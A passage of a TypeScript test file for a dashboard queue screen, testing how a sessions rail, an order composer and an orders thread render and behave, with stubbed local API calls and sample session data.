    const [header] = findNodes(render("QueueHeaderQ", { queue: { reload: () => undefined, sessions: buildSessions(), ...queue } }), (node) => node.props?.atom === "PageHeader");
    const freshness = header?.props.freshness as { props: Record<string, unknown> };
    const refresh = header?.props.refresh as { props: Record<string, unknown> };
    const stamp = collectText(renderScreen(freshness) as RenderedNode).replace(/\s+/g, " ");
    return { stamp, isBusy: refresh.props.isBusy };
  };

  // the freshness slot holds the page's own cadence; only a failed list read with rows on screen replaces it
  const rows = [
    { name: "a failed resume re-read leaves the header on the page's cadence", queue: { list: list(), resumes: resumes({ data: [], error: "HTTP 503 database_unavailable" }) }, stamp: /^Checks every 15s$/, isBusy: false },
    { name: "a failed list read with rows loaded says the page is not updated and when it last read", queue: { list: list({ data: { items: [] }, readAt: "2026-11-13T12:29:00.000Z", error: { detail: "HTTP 500" } }), resumes: resumes() }, stamp: /^⚠ Not updated · last read 21:29$/, isBusy: false },
    { name: "a resume read in flight keeps Refresh busy", queue: { list: list(), resumes: resumes({ busy: true }) }, stamp: /^Checks every 15s$/, isBusy: true },
    { name: "both reads landed shows the page's cadence", queue: { list: list(), resumes: resumes() }, stamp: /^Checks every 15s$/, isBusy: false },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { stamp, isBusy } = getHeader(row.queue);
      assert.match(stamp.trim(), row.stamp);
      assert.equal(isBusy, row.isBusy);
    });
  }
});

const ENDED_ID = "3d8a5f20-7c41-4b9e-8e2d-5a1c6b0f9e37";
const REPLACED_ID = "c41e9b07-2f6d-4a83-9b15-7e0d3c8a2f64";

function buildSessionRow(overrides: Record<string, unknown> = {}) {
  const id = String(overrides.id ?? SESSION_ID);
  return {
    id,
    sessionIdPrefix: id.slice(0, 8),
    name: "nightly-docs-sweep",
    isNameRegistered: true,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    state: "live",
    exitReason: null,
    isWaiting: false,
    lastActivityAt: "2026-11-12T03:41:09.336Z",
    count: { awaiting: 1, inDelivery: 0 },
    markerSetAt: null,
    isSelectable: true,
    ...overrides,
  };
}

const SESSION_ROWS = [
  buildSessionRow(),
  buildSessionRow({ id: ENDED_ID, name: "atrium-hooks", isNameRegistered: false, state: "exited", exitReason: "ended" }),
  buildSessionRow({ id: REPLACED_ID, state: "exited", exitReason: "replaced", isSelectable: false }),
];

function buildSessions(overrides: Record<string, unknown> = {}) {
  return {
    region: { status: "ready", data: { sessions: SESSION_ROWS, hasMore: false }, error: null, busy: false },
    read: () => undefined,
    selectedIds: [],
    toggle: () => undefined,
    clear: () => undefined,
    isEndedShown: false,
    setEndedShown: () => undefined,
    ...overrides,
  };
}

// the Orders mode as useOrdersQ hands it to the desk, open by default
function buildOrders(overrides: Record<string, unknown> = {}) {
  return {
    isOpen: true, open: () => undefined, close: () => undefined, showEarlier: () => undefined, resend: () => undefined,
    thread: { status: "ready", items: [], nextCursor: null, error: null },
    composer: { text: "", isBusy: false, error: null }, setText: () => undefined, setImages: () => undefined, send: () => undefined, reply: null, linkReply: () => undefined, read: () => undefined, ...overrides,
  };
}

// the order view with its slots, the rail's ticks beside it
function renderOrders(orders: Record<string, unknown>, sessions: Record<string, unknown> = {}): RenderedNode {
  const { queue } = buildQueue({ sessions: buildSessions(sessions), orders: buildOrders(orders) });
  return renderCard("OrdersViewQ", { queue: withList(queue, []) });
}

// a Card atom's slots ride its props → rendered beside its body, so one tree holds the whole card
function renderCard(name: string, props: unknown): RenderedNode {
  const tree = render(name, props);
  const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
  const slots = ["title", "sub", "right", "bar", "foot"].map((key) => renderScreen(card?.props[key])).filter((node): node is RenderedNode => node !== null && typeof node !== "string");
  return { type: "Fragment", props: {}, children: [tree, ...slots] } as RenderedNode;
}

// the rail as the desk renders it: the page's scope, ticks and list
function renderRail(sessions: Record<string, unknown> = {}, filter = { profile: "", session: "" }, items: unknown[] = [], isOrders = false) {
  const filters: unknown[] = [];
  const { queue } = buildQueue({ sessions: buildSessions(sessions), orders: { isOpen: isOrders, open: () => undefined } });
  const tree = renderCard("SessionsRegionQ", { queue: { ...withList(queue, items), filter, setFilter: (next: unknown) => filters.push(next) } });
  return { tree, filters: () => getPlain(filters) };
}

const railRowOf = (tree: RenderedNode, id: string) => findNodes(tree, (node) => node.props?.["data-session"] === id)[0] as RenderedNode;

describe("sessions rail rows", () => {
  test("a row shows the registered name, and a nameless row shows its start-directory name marked as such", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const named = collectText(railRowOf(tree, SESSION_ID));
    const nameless = collectText(railRowOf(tree, ENDED_ID));
    assert.ok(named.includes("nightly-docs-sweep") && !named.includes("start directory"), named);
    assert.ok(nameless.includes("atrium-hooks") && nameless.includes("start directory"), nameless);
  });

  test("two shown rows sharing a name show their id prefixes, and a unique name shows none", () => {
    const rows = [buildSessionRow(), buildSessionRow({ id: ENDED_ID, sessionIdPrefix: "4c0e19aa" }), buildSessionRow({ id: REPLACED_ID, name: "gersona" })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const prefixes = (id: string) => findNodes(railRowOf(tree, id), (node) => node.props?.atom === "MachineString").length;
    assert.deepEqual([prefixes(SESSION_ID), prefixes(ENDED_ID), prefixes(REPLACED_ID)], [1, 1, 0]);
  });

  // line 2: the first matching condition (spec §9.1 → Line 2)
  const lines = [
    { name: "something not received leads", row: { state: "live", count: { awaiting: 0, inDelivery: 2 } }, notReceived: 1, first: { text: "1 not received", badge: "warn" } },
    { name: "an unreachable session says so", row: { state: "stale" }, notReceived: 0, first: { text: "Not reachable", badge: "warn" } },
    { name: "a live session with orders on the way counts them", row: { state: "live", count: { awaiting: 0, inDelivery: 1 } }, notReceived: 0, first: { text: "Live", mark: "ok" }, second: "1 in delivery" },
    { name: "a live session with nothing on the way gives its last activity", row: { state: "live" }, notReceived: 0, first: { text: "Live", mark: "ok" } },
    { name: "an automatic resume not yet registered says so", row: { state: "exited", exitReason: "ended", markerSetAt: "2026-11-12T12:20:11.204Z" }, notReceived: 0, first: { text: "Resume not yet registered" } },
    { name: "an ended session wears its exit word", row: { state: "exited", exitReason: "dead" }, notReceived: 0, first: { text: "Ended · process gone", badge: "tag" } },
  ];
  for (const row of lines) {
    test(`line 2: ${row.name}`, () => {
      const facts = call<Array<{ text: string }>>("getSessionLineQ", buildSessionRow(row.row), row.notReceived);
      assert.deepEqual(facts[0], row.first);
      if (row.second) assert.equal(facts[1]?.text, row.second);
    });
  }

  test("a row that takes no message has no checkbox, and every other row's box is named for the order", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const boxOf = (id: string) => findNodes(railRowOf(tree, id), (node) => node.type === "input" && node.props.type === "checkbox")[0];
    assert.equal(boxOf(SESSION_ID)?.props["aria-label"], "Order to nightly-docs-sweep");
    assert.equal(boxOf(REPLACED_ID), undefined);
  });

  test("ticking a row calls the toggle with that row's id", () => {
    const toggled: unknown[] = [];
    const { tree } = renderRail({ isEndedShown: true, toggle: (id: string) => toggled.push(id) });
    const [box] = findNodes(railRowOf(tree, ENDED_ID), (node) => node.type === "input" && node.props.type === "checkbox");
    (box?.props.onChange as () => void)();
    assert.deepEqual(toggled, [ENDED_ID]);
  });

  test("ticking adds a row and ticking it again removes it, keeping the other ticks", () => {
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID], ENDED_ID), [SESSION_ID, ENDED_ID]);
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID, ENDED_ID], SESSION_ID), [ENDED_ID]);
  });

  test("ended rows stay folded until the Ended band is open", () => {
    const ids = (isEndedShown: boolean) => call<Array<{ id: string }>>("getShownSessionsQ", SESSION_ROWS, isEndedShown).map((row) => row.id);
    assert.deepEqual(ids(false), [SESSION_ID]);
    assert.deepEqual(ids(true), [SESSION_ID, ENDED_ID, REPLACED_ID]);
  });

  test("the waiting count is the row's one solid badge, and a session with nothing waiting shows none", () => {
    const rows = [buildSessionRow({ count: { awaiting: 5, inDelivery: 0 } }), buildSessionRow({ id: ENDED_ID, name: "gersona", count: { awaiting: 0, inDelivery: 0 } })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const solid = (id: string) => findNodes(railRowOf(tree, id), (node) => node.props?.atom === "Badge" && node.props.fill === "solid").map((node) => collectText(node));
    assert.deepEqual([solid(SESSION_ID), solid(ENDED_ID)], [["5"], []]);
  });
});

describe("the rail as the session scope", () => {
  test("pressing a row scopes the list to that session and keeps the account", () => {
    const { tree, filters } = renderRail({}, { profile: "work-dev", session: "" });
    const [button] = findNodes(railRowOf(tree, SESSION_ID), (node) => node.type === "button");
    (button?.props.onClick as () => void)();
    assert.deepEqual(filters(), [{ profile: "work-dev", session: SESSION_ID }]);
  });

  test("the scoped row and only it is current, and All sessions is current with no scope", () => {
    const current = (session: string) => findNodes(renderRail({}, { profile: "", session }).tree, (node) => node.props?.["aria-current"] === "true").map((node) => collectText(node));
    assert.ok(current(SESSION_ID).length === 1 && current(SESSION_ID)[0]?.includes("nightly-docs-sweep"), String(current(SESSION_ID)));
    assert.ok(current("").length === 1 && current("")[0]?.includes("All sessions"), String(current("")));
  });

  test("All sessions clears the scope", () => {
    const { tree, filters } = renderRail({}, { profile: "", session: SESSION_ID });
    const [band] = findNodes(tree, (node) => node.type === "button" && collectText(node).includes("All sessions"));
    (band?.props.onClick as () => void)();
    assert.deepEqual(filters(), [{ profile: "", session: "" }]);
  });

  // master box: every live session that takes a message; an ended one is ticked on its own row
  const masters = [
    { name: "none ticked ticks every live session", ids: [], next: [SESSION_ID], state: "none" },
    { name: "an ended tick alone stays and the live ones join it", ids: [ENDED_ID], next: [ENDED_ID, SESSION_ID], state: "none" },
    { name: "every live session ticked unticks them and keeps the ended tick", ids: [ENDED_ID, SESSION_ID], next: [ENDED_ID], state: "all" },
  ];
  for (const row of masters) {
    test(`the master box: ${row.name}`, () => {
      assert.equal(call("getMasterTickQ", row.ids, SESSION_ROWS), row.state);
      assert.deepEqual(call("putMasterTickQ", row.ids, SESSION_ROWS), row.next);
    });
  }

  test("the master box shows the mixed state while only some live sessions are ticked", () => {
    const rows = [buildSessionRow(), buildSessionRow({ id: ENDED_ID, state: "live" })];
    assert.equal(call("getMasterTickQ", [SESSION_ID], rows), "some");
  });

  test("the session ticks round-trip through the hash", async () => {
    const location = { hash: "#queue?to=a1,b2&item=7" };
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub(), location, history: { replaceState: (_s: unknown, _t: string, url: string) => { location.hash = url; } } } })) as ScreenModule;
    assert.deepEqual(getPlain((module.getTicksFromHashQ as () => unknown)()), ["a1", "b2"]);
    (module.setHashStateQ as (patch: unknown) => void)({ to: "" });
    assert.deepEqual(getPlain((module.getTicksFromHashQ as () => unknown)()), []);
  });
});

describe("the rail foot", () => {
  const resumes = (results: string[]) => ({ status: "ready", busy: false, error: null, data: results.map((result, index) => ({ item: { id: index + 1, title: "Rebase" }, session: { profileLabel: "work-dev", cwdTail: "wt/a" }, attempt: 1, sentAt: "2026-11-12T12:20:11.204Z", result, abortReason: null, bgId: null })) });
  const footButton = (region: unknown) => {
    const { queue } = buildQueue({ resumes: region });
    const tree = renderCard("SessionsRegionQ", { queue: { ...withList(queue, []), filter: { profile: "", session: "" }, setFilter: () => undefined } });
    return findNodes(tree, (node) => node.type === "button" && collectText(node).includes("Automatic resumes")).map((node) => collectText(node));
  };
  const rows = [
    { name: "two resumes open from one quiet button with their count", region: resumes(["sent", "acked"]), expected: ["Automatic resumes 2"] },
    { name: "a failed resume puts the warning glyph before the label", region: resumes(["failed"]), expected: ["⚠ Automatic resumes 1"] },
    { name: "no resume renders no button", region: resumes([]), expected: [] },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(footButton(row.region), row.expected));
});

describe("order composer", () => {
  const shown = SESSION_ROWS;
  test("the targets are the ticked rows on show, never a hidden ended row or a replaced row", () => {
    const ticked = [SESSION_ID, ENDED_ID, REPLACED_ID];
    assert.deepEqual(call("getSendTargetsQ", shown, ticked), { ids: [SESSION_ID, ENDED_ID], names: ["nightly-docs-sweep", "atrium-hooks"], endedCount: 1 });
    assert.deepEqual(call("getSendTargetsQ", [shown[0]], ticked), { ids: [SESSION_ID], names: ["nightly-docs-sweep"], endedCount: 0 });
  });

  // spec §9.2 → Foot: the send button names who the order goes to
  const labels = [
    { name: "no tick", targets: { ids: [], names: [], endedCount: 0 }, label: "Send order" },
    { name: "one target names it", targets: { ids: [SESSION_ID], names: ["gersona"], endedCount: 0 }, label: "Send to gersona" },
    { name: "several targets count them", targets: { ids: [SESSION_ID, ENDED_ID], names: ["gersona", "yoaida"], endedCount: 0 }, label: "Send to 2 sessions" },
    { name: "an ended target among them", targets: { ids: [SESSION_ID, ENDED_ID], names: ["gersona", "yoaida"], endedCount: 1 }, label: "Send to 2 sessions · resumes 1 ended" },
  ];
  for (const row of labels) test(`the send label: ${row.name}`, () => assert.equal(call("getSendLabelQ", row.targets), row.label));

  const MAX_TARGETS = vm.runInContext("MESSAGE_Q.MAX_TARGETS", screen) as number;
  const targetsOf = (count: number) => ({ ids: Array.from({ length: count }, () => randomUUID()), names: Array.from({ length: count }, (_v, index) => `s${index}`), endedCount: 0 });
  // spec §9.2 → Foot: a press with something missing says what, and focus goes to the control that fixes it
  const invalids = [
    { name: "no session ticked", targets: targetsOf(0), text: "rebase on main", invalid: { message: "Tick at least one session in the rail.", focus: "rail" } },
    { name: "blank text", targets: targetsOf(1), text: " \n\t ", invalid: { message: "Write the order, then send.", focus: "box" } },
    { name: "more targets than one send takes", targets: targetsOf(MAX_TARGETS + 3), text: "rebase on main", invalid: { message: `Up to ${MAX_TARGETS} sessions per order: untick 3.`, focus: "rail" } },
    { name: "the cap itself", targets: targetsOf(MAX_TARGETS), text: "rebase on main", invalid: null },
  ];
  for (const row of invalids) test(`a send press: ${row.name}`, () => assert.deepEqual(call("getOrderInvalidQ", row.targets, row.text), row.invalid));

  // spec §9.2 → The Re: line: a reply while the report's session is the one tick; a second tick or the ✕ makes it a plain order
  const REPORT = buildItem({ id: 61, kind: "report", title: "Nightly sweep done", options: [], session: buildSession({ name: "atrium" }) });
  const replyComposer = (reply: unknown, ids: string[]) => {
    const { queue, calls } = buildQueue({ drafts: { 61: { text: "ship it" } }, orders: buildOrders({ reply, composer: { text: "typed order", isBusy: false, error: null }, send: (...args: unknown[]) => calls.push(["orderSend", ...args]), dropReply: () => calls.push(["dropReply"]) }) });
    const targets = { ids, names: ids.map((id) => (id === SESSION_ID ? "atrium" : "yoaida")), endedCount: 0 };
    return { tree: render("OrderComposerQ", { queue: withList(queue, []), targets }), calls };
  };
  const replies = [
    { name: "the report's session alone → the Re: line, the report's draft and its own Send order", reply: { item: REPORT, isDropped: false }, ids: [SESSION_ID], line: true, text: "ship it", note: "Sends this to atrium and closes the report.", sent: ["settle", 61, "reply", { text: "ship it" }] },
    { name: "a second tick → a plain order, the report stays open", reply: { item: REPORT, isDropped: false }, ids: [SESSION_ID, ENDED_ID], line: false, text: "ship it", note: "Not a reply any more: the report stays open.", sent: ["orderSend", { sessionIds: [SESSION_ID, ENDED_ID], text: "ship it" }] },
    { name: "the ✕ pressed → a plain order from the order box", reply: { item: REPORT, isDropped: true }, ids: [SESSION_ID], line: false, text: "typed order", note: "Not a reply any more: the report stays open.", sent: ["orderSend", { sessionIds: [SESSION_ID], text: "typed order" }] },
    { name: "no report → the order box", reply: null, ids: [SESSION_ID], line: false, text: "typed order", note: "Goes to atrium.", sent: ["orderSend", { sessionIds: [SESSION_ID], text: "typed order" }] },
  ];
  for (const row of replies) {
    test(`an order from a report: ${row.name}`, () => {
      const { tree, calls } = replyComposer(row.reply, row.ids);
      const text = collectText(tree);
      assert.equal(text.includes("Re: Nightly sweep done"), row.line, text);
      assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Do not link this order to the report").length, row.line ? 1 : 0);
      assert.equal(findNodes(tree, (node) => node.type === "textarea")[0]?.props.value, row.text);
      assert.ok(text.includes(row.note), text);
      const [send] = findNodes(tree, (node) => node.type === "button" && String(node.props.className).includes("primary"));
      (send?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls.filter((one) => ["settle", "orderSend"].includes(String(one[0])))[0]?.slice(0, row.sent.length)), row.sent);
    });
  }

  test("the ✕ on the Re: line drops the link", () => {
    const { tree, calls } = replyComposer({ item: REPORT, isDropped: false }, [SESSION_ID]);
    const [drop] = findNodes(tree, (node) => node.props?.["aria-label"] === "Do not link this order to the report");
    (drop?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls.filter((one) => one[0] === "dropReply")), [["dropReply"]]);
  });

  const notes = [
    { name: "none ticked", count: 0, note: "Tick sessions in the rail." },
    { name: "one ticked", count: 1, note: "Goes to s0." },
    { name: "several ticked", count: 2, note: "Each ticked session gets its own copy." },
  ];
  for (const row of notes) test(`the note at rest: ${row.name}`, () => assert.equal(call("getOrderNoteQ", targetsOf(row.count)), row.note));

  test("the page's per-send target cap is the send route's: the cap passes and one more is refused", () => {
    const text = "rebase on main";
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS), text }).success, true);
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS + 1), text }).success, false);
  });
});

describe("an order send's answer", () => {
  const run = async (status: number, answer: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null };
    const statuses: string[] = [];
    const counts = { sent: 0 };
    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" },
      names: ["gersona", "yoaida"],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); },
      setStatus: (next: string) => statuses.push(next),
      onSent: () => { counts.sent += 1; },
    });
    return { isDone, posts: getPlain(posts), composer: getPlain(composer), statuses, sent: counts.sent };
  };

  // spec §9.3 → After sending: the ticks stay, so the next line goes to the same sessions; the list's status line names them
  test("a taken send posts every ticked id with the text, empties the box, says who it went to and re-reads", async () => {
    const result = await run(201, { items: [{ id: 81, sessionId: SESSION_ID }, { id: 82, sessionId: ENDED_ID }] });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/messages/send", body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" } }]);
    assert.equal(result.isDone, true);
    assert.deepEqual(result.composer, { text: "", isBusy: false, error: null });
    assert.deepEqual(result.statuses, ["✓ Order sent to gersona and yoaida"]);
    assert.equal(result.sent, 1);
  });

  const refusals = [
    { name: "a replaced target names the server's reason", status: 409, answer: { error: "session_replaced", reason: "a replaced session takes no message" }, error: "Refused: a replaced session takes no message." },
    { name: "an unknown target names the server's reason", status: 404, answer: { error: "unknown_session", reason: "every target must be a registered session" }, error: "Refused: every target must be a registered session." },
    { name: "a refusal with no reason shows fixed copy", status: 403, answer: { error: "forbidden" }, error: "The monitor refused this order. Refresh the session list and try again." },
  ];
  for (const row of refusals) {
    test(`a refused send keeps the text: ${row.name}`, async () => {
      const result = await run(row.status, row.answer);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.composer, { text: "rebase on main", isBusy: false, error: row.error });
      assert.deepEqual([result.statuses, result.sent], [[], 0]);
    });
  }

  test("a send during an outage gives the page's outage step", async () => {
    const result = await run(503, { error: "database_unavailable" });
    assert.equal(result.composer.error, call("getActionErrorQ", { status: 503, data: { error: "database_unavailable" } }));
  });

  const sentLines = [
    { name: "one session", names: ["gersona"], line: "✓ Order sent to gersona" },
    { name: "three sessions", names: ["gersona", "yoaida", "atrium"], line: "✓ Order sent to gersona, yoaida and atrium" },
  ];
  for (const row of sentLines) test(`the sent line names every recipient: ${row.name}`, () => assert.equal(call("getOrderSentStatusQ", row.names), row.line));
});

describe("the Orders mode", () => {
  const OTHER_ID = "3d8a51c2-7e04-4b19-a6c3-5f2e9d0b8a17";
  const named = (name: string, id = SESSION_ID) => buildSession({ id, name });
  const copy = (overrides: Record<string, unknown>) => buildItem({ kind: "message", status: "answered", options: [], answeredAt: "2026-11-12T12:26:04.118Z", ...overrides });

  const modes = [
    { name: "open puts the list and the sheet away, mounted, and shows the order view", isOpen: true, hidden: true, views: 1 },
    { name: "closed shows the list and the sheet and no order view", isOpen: false, hidden: undefined, views: 0 },
  ];
  for (const row of modes) {
    test(row.name, () => {
      const tree = render("QueueDeskQ", { queue: { ...withList(buildQueue().queue, [buildItem({ id: 1 })]), orders: buildOrders({ isOpen: row.isOpen }) } });
      const [away] = findNodes(tree, (node) => node.props?.className === "queue-away");
      assert.equal(away?.props.hidden, row.hidden);
      assert.deepEqual(findNodes(away as RenderedNode, (node) => ["QueueListQ", "QueueSheetQ"].includes(node.type)).map((node) => node.type), ["QueueListQ", "QueueSheetQ"]);
      assert.equal(findNodes(tree, (node) => node.type === "OrdersViewQ").length, row.views);
    });
  }

  const dialog = { closest: (selector: string) => (selector === '[role="dialog"]' ? {} : null) };
  const desk = { closest: () => null };
  const keys = [
    { name: "Esc while open closes", key: "Escape", isOpen: true, target: desk, isClose: true },
    { name: "Esc while closed does nothing", key: "Escape", isOpen: false, target: desk, isClose: false },
    { name: "another key does nothing", key: "Enter", isOpen: true, target: desk, isClose: false },
    { name: "an open drawer takes the Esc first", key: "Escape", isOpen: true, target: dialog, isClose: false },
  ];
  for (const row of keys) {
    test(`a desk key: ${row.name}`, () => assert.equal(call("isOrdersCloseKeyQ", { key: row.key, defaultPrevented: false, target: row.target }, row.isOpen), row.isClose));
  }

  test("the list's and the sheet's scroll positions stored on entering are set again on leaving", () => {
    const bodies: Record<string, { scrollTop: number }> = { ".queue-list > .card-body": { scrollTop: 412 }, ".queue-sheet > .card-body": { scrollTop: 96 } };
    const root = { querySelector: (selector: string) => bodies[selector] ?? null };
    const stored = (screen.getPaneScrollsQ as (r: unknown) => unknown)(root);
    for (const body of Object.values(bodies)) body.scrollTop = 0;
    (screen.setPaneScrollsQ as (r: unknown, s: unknown) => void)(root, stored);
    assert.deepEqual(Object.values(bodies).map((body) => body.scrollTop), [412, 96]);
  });

  test("the history read asks for the ticked sessions' orders a page at a time, and Show earlier continues from the cursor", async () => {
    const urls: string[] = [];
    const pages = [
      { items: [copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1" })], nextCursor: "1762950364118000:70" },
      { items: [copy({ id: 70, sendId: "s1" }), copy({ id: 40, sendId: "s0" })], nextCursor: null },
    ];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => pages[urls.length - 1] };
      },
    })) as ScreenModule;
    let thread: { items: Array<{ id: number }>; nextCursor: string | null } = { items: [], nextCursor: null };
    const setThread = (next: (prev: unknown) => typeof thread) => { thread = next(thread); };
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID, OTHER_ID], before: null, setThread });
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID, OTHER_ID], before: thread.nextCursor, setThread });
    const queries = urls.map((url) => Object.fromEntries(new URL(url, "http://monitor").searchParams));
    assert.deepEqual(urls.map((url) => url.split("?")[0]), ["/api/queue/owner/orders", "/api/queue/owner/orders"]);
    assert.deepEqual(queries, [{ limit: "30", sessionIds: `${SESSION_ID},${OTHER_ID}` }, { limit: "30", sessionIds: `${SESSION_ID},${OTHER_ID}`, before: "1762950364118000:70" }]);
    assert.deepEqual(getPlain(thread.items).map((item) => item.id), [90, 70, 40], "a copy on both pages is kept once");
  });

  test("no tick reads the orders to every session", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub() }, fetch: async (url: string) => { urls.push(url); return { status: 200, json: async () => ({ items: [], nextCursor: null }) }; } })) as ScreenModule;
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [], before: null, setThread: () => undefined });
    assert.deepEqual(Object.fromEntries(new URL(urls[0] as string, "http://monitor").searchParams), { limit: "30" });
  });

  test("the thread folds the copies of one send into one entry, the oldest order first", () => {
    const items = [
      copy({ id: 91, sendId: "s2", session: named("yoaida", OTHER_ID) }), copy({ id: 90, sendId: "s2" }),
      buildItem({ id: 50, kind: "report", status: "delivered", options: [], answeredAt: "2026-11-11T09:00:00.000Z", answer: { code: null, text: "ship it" } }),
      copy({ id: 31, sendId: null, answeredAt: "2026-11-10T01:00:00.000Z", body: "old", session: named("yoaida", OTHER_ID) }), copy({ id: 30, sendId: null, answeredAt: "2026-11-10T01:00:00.000Z", body: "old" }),
    ];
    const entries = call<Array<{ id: number; copies: Array<{ id: number }> }>>("getThreadEntriesQ", items);
    assert.deepEqual(entries.map((entry) => [entry.id, entry.copies.map((one) => one.id)]), [[30, [30, 31]], [50, [50]], [90, [90, 91]]]);
  });

  test("an order shows its text, a reply to a report leads its time line with Re: and the report's title", () => {
    // the bubble's text rides ProseText's prop → read beside the rendered text
    const text = (item: unknown) => {
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", [item])[0], onResend: () => undefined });
      return [collectText(tree), ...findNodes(tree, (node) => node.props?.atom === "ProseText").map((node) => String(node.props.text))].join(" ");
    };
    const message = text(copy({ id: 90, sendId: "s2", body: "rebase on main" }));
    const reply = text(buildItem({ id: 50, kind: "report", title: "Nightly sweep done", status: "delivered", options: [], answeredAt: "2026-11-11T09:00:00.000Z", answer: { code: null, text: "ship it" } }));
    assert.ok(message.includes("rebase on main") && !message.includes("Re:"), message);
    assert.ok(reply.includes("ship it") && reply.includes("Re: Nightly sweep done"), reply);
  });

  test("each recipient shows its one receipt word, and only a recipient that did not receive it can be resent", () => {
    const resent: unknown[] = [];
    const entry = call<unknown[]>("getThreadEntriesQ", [
      copy({ id: 90, sendId: "s2", status: "delivered", deliveredAt: "2026-11-12T12:28:00.000Z", session: named("gersona") }),
      copy({ id: 91, sendId: "s2", session: named("yoaida", OTHER_ID) }),
      copy({ id: 92, sendId: "s2", status: "unacked", canResend: true, session: named("atrium", ENDED_ID) }),
    ])[0];
    const tree = render("OrderEntryQ", { entry, onResend: (id: number) => resent.push(id) });
    const rows = findNodes(tree, (node) => node.props?.className === "queue-recipient").map((node) => collectText(node));
    assert.deepEqual(rows.map((row) => [["gersona", "yoaida", "atrium"].find((name) => row.startsWith(name)), ["Received", "Not yet", "Not received"].find((word) => row.includes(word))]), [["gersona", "Received"], ["yoaida", "Not yet"], ["atrium", "Not received"]]);
    const resends = buttonLabelled(tree, "Resend");
    assert.equal(resends.length, 1);
    (resends[0]?.props.onClick as () => void)();
    assert.deepEqual(getPlain(resent), [[92]]);
  });

  const lines = (count: number) => Array.from({ length: count }, (_, index) => `step ${index + 1}`).join("\n");
  const clamps = [
    { name: "12 lines show in full with no disclosure", body: lines(12), isClamped: false, more: [] },
    { name: "31 lines clamp at 12 under Show all 31 lines", body: lines(31), isClamped: true, more: ["Show all 31 lines"] },
  ];
  for (const row of clamps) {
    test(`an order's bubble: ${row.name}`, () => {
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", [copy({ id: 90, sendId: "s2", body: row.body })])[0], onResend: () => undefined });
      const [bubble] = findNodes(tree, (node) => String(node.props?.className ?? "").split(" ").includes("queue-bubble"));
      assert.equal(String(bubble?.props.className).split(" ").includes("is-clamped"), row.isClamped);
      assert.deepEqual(findNodes(tree, (node) => node.type === "summary").map((node) => collectText(node).trim()), row.more);
    });
  }

  const fan = (receipts: string[]) => receipts.map((receipt, index) => copy({
    id: 90 + index, sendId: "s7", session: named(`session-${index}`, randomUUID()),
    ...({ received: { status: "delivered", deliveredAt: "2026-11-12T12:28:00.000Z" }, notYet: {}, notReceived: { status: "unacked", canResend: true } } as Record<string, object>)[receipt],
  }));
  test("five recipients or more fold into one roll-up line; a recipient that did not receive it stays listed under it", () => {
    const entry = call<unknown[]>("getThreadEntriesQ", fan(["received", "received", "received", "received", "received", "notYet", "notReceived"]))[0];
    const tree = render("OrderEntryQ", { entry, onResend: () => undefined });
    const [rollUp] = findNodes(tree, (node) => node.type === "summary");
    assert.ok(collectText(rollUp as RenderedNode).includes("7 sessions · 5 received · 1 not yet"), collectText(rollUp as RenderedNode));
    assert.ok(collectText(rollUp as RenderedNode).includes("1 not received"), collectText(rollUp as RenderedNode));
    const [details] = findNodes(tree, (node) => node.type === "details");
    const outside = findNodes(tree, (node) => node.props?.className === "queue-recipient").filter((node) => !findNodes(details as RenderedNode, (inner) => inner === node).length);
    assert.deepEqual(outside.map((node) => collectText(node).split("Not")[0]?.trim()), ["session-6"]);
    assert.equal(findNodes(details as RenderedNode, (node) => node.props?.className === "queue-recipient").length, 6, "the not received one is listed once, outside");
  });

  test("four recipients keep a row each and no roll-up line", () => {
    const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", fan(["received", "notYet", "notYet", "notReceived"]))[0], onResend: () => undefined });
    assert.equal(findNodes(tree, (node) => node.type === "details").length, 0);
    assert.equal(findNodes(tree, (node) => node.props?.className === "queue-recipient").length, 4);
  });

  const resendAlls = [
    { name: "two that can be resent → Resend to 2, sent to those two only", receipts: ["received", "notReceived", "notYet", "notReceived"], label: ["Resend to 2"], ids: [91, 93] },
